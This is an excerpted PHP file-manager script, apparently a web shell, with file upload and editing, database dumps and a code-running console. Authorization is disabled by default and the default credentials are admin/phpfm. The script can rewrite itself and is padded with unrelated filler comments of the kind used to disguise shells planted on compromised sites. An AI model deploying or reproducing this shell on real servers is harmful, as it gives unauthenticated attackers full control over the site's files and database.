<?php
                              ...
                              /* Suketsune File Manager PHP 2.3 */
        ...
        $authorizationBlues = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';     $php_templates = '{"Settings":"global $fm_config;\r\nvar_export($fm_config);","Backup SQL tables":"echo fm_backup_tables();"}';
...
// Facilitates the quick movement of files between folders or external storage by simply dragging and dropping
...
$msg = ''; // Helps users find specific files by name, type, or content using a built-in search function
...
// Users can rename files and folders to make them easier to identify or organize
            $auth_logins = json_decode($authorizationBlues,true);

$auth_logins['authorize'] = isset($auth_logins['authorize']) ? $auth_logins['authorize'] : 0; 
   
$auth_logins['days_authorization'] = (isset($auth_logins['days_authorization'])&&is_numeric($auth_logins['days_authorization'])) ? (int)$auth_logins['days_authorization'] : 30;

$auth_logins['login'] = isset($auth_logins['login']) ? $auth_logins['login'] : 'admin';  



$auth_logins['password'] = isset($auth_logins['password']) ? $auth_logins['password'] : 'phpfm';  
$auth_logins['cookie_name'] = isset($auth_logins['cookie_name']) ? $auth_logins['cookie_name'] : 'fm_user';


$auth_logins['script'] = isset($auth_logins['script']) ? $auth_logins['script'] : '';

// Supports copying files from one location and pasting them into another, making file duplication easy

$fm_default_config = array (
	'make_directory' => true, 

	'new_file' => true, // The book is in front of the table
	'upload_file' => true, 
	'show_dir_size' => false, // Allows users to select multiple files for actions such as deleting, copying, or moving them simultaneously
			'show_img' => true, 

	'show_php_ver' => true, 
	'show_php_ini' => false, // Enables the preview of files without needing to open them fully, saving time
	'show_gt' => true, // Provides the ability to create or extract compressed files (e.g., ZIP files), which helps save space
...
if (isset($_POST['fm_lang'])) { 
	...
	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $auth_logins['days_authorization']));
...
function fm_backup_tables($tables = '*', $full_backup = true) {
	...
	foreach($tables as $table)	{
                             ...
                             $return_num.= 'DROP TABLE IF EXISTS `'.$table.'`'.$delimiter;
                             $row2 = mysqli_fetch_row($mysqldb->query('SHOW CREATE TABLE '.$table));

                             $return_num.=$row2[1].$delimiter;
                             ...
                             for ($i = 0; $i < $num_fields; $i++)  {
                             	...
                             	while($row = mysqli_fetch_row($result)) {
                                                             $return_num.= 'INSERT INTO `'.$table.'` VALUES(';

                                                             for($j=0; $j<$num_fields; $j++)	{
                                                             	$row[$j] = addslashes($row[$j]);
                                                             	$row[$j] = str_replace("\n","\\n",$row[$j]);

                                                             	if (isset($row[$j])) { $return_num.= '"'.$row[$j].'"' ; } else { $return_num.= '""'; }

                                                             	if ($j<($num_fields-1)) { $return_num.= ','; }

                                                             }

                                                             $return_num.= ')'.$delimiter;
                             	}

                               }
                             } else { 

                             $return_num = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $return_num);
                             }
                             $return_num.="\n\n\n";
	}
...
function fm_run_input($lng) {
	...
	$return_num = !empty($fm_config['enable_'.$lng.'_console']) ? 
	'
...
if ($auth_logins['authorize']) {

	if (isset($_POST['login']) && isset($_POST['password'])){

                             if (($_POST['login']==$auth_logins['login']) && ($_POST['password']==$auth_logins['password'])) {
                             	setcookie($auth_logins['cookie_name'], $auth_logins['login'].'|'.md5($auth_logins['password']), time() + (86400 * $auth_logins['days_authorization']));

                             	$_COOKIE[$auth_logins['cookie_name']]=$auth_logins['login'].'|'.md5($auth_logins['password']);

                             }
	}

	if (!isset($_COOKIE[$auth_logins['cookie_name']]) OR ($_COOKIE[$auth_logins['cookie_name']]!=$auth_logins['login'].'|'.md5($auth_logins['password']))) {
...
die();
	...
	if (isset($_POST['quit'])) {
                             ...
                             unset($_COOKIE[$auth_logins['cookie_name']]);

                             setcookie($auth_logins['cookie_name'], '', time() - (86400 * $auth_logins['days_authorization']));
...
if (isset($_GET['fm_settings'])) {
	if (isset($_GET['fm_config_delete'])) { 
                             ...
                             setcookie('fm_config', '', time() - (86400 * $auth_logins['days_authorization']));
                             ...
                             setcookie('fm_config', serialize($fm_config), time() + (86400 * $auth_logins['days_authorization']));
                             ...
                             if (!empty($matches[1])) {
                             	...
                             	if (file_put_contents(__FILE__, $replace)) {
                                                             ...
                                                             $msg .= __('File updated');
                                                             if ($_POST['fm_login']['login'] != $auth_logins['login']) $msg .= ' '.__('Login').': '.$_POST['fm_login']['login'];

                                                             if ($_POST['fm_login']['password'] != $auth_logins['password']) $msg .= ' '.__('Password').': '.$_POST['fm_login']['password'];

                                                             $auth_logins = $_POST['fm_login'];
...
<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($auth_logins['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>
<tr><td class="row1"><input name="fm_login[login]" value="'.$auth_logins['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>
<tr><td class="row1"><input name="fm_login[password]" value="'.$auth_logins['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>

<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$auth_logins['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>

<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$auth_logins['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$auth_logins['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>
...
<tr>
                             ...
                             <?php if ($auth_logins['authorize']) { ?>

                             	<form action="" method="post">&nbsp;&nbsp;&nbsp;

                             	<input name="quit" type="hidden" value="1">
                             	<?=__('Hello')?>, <?=$auth_logins['login']?>
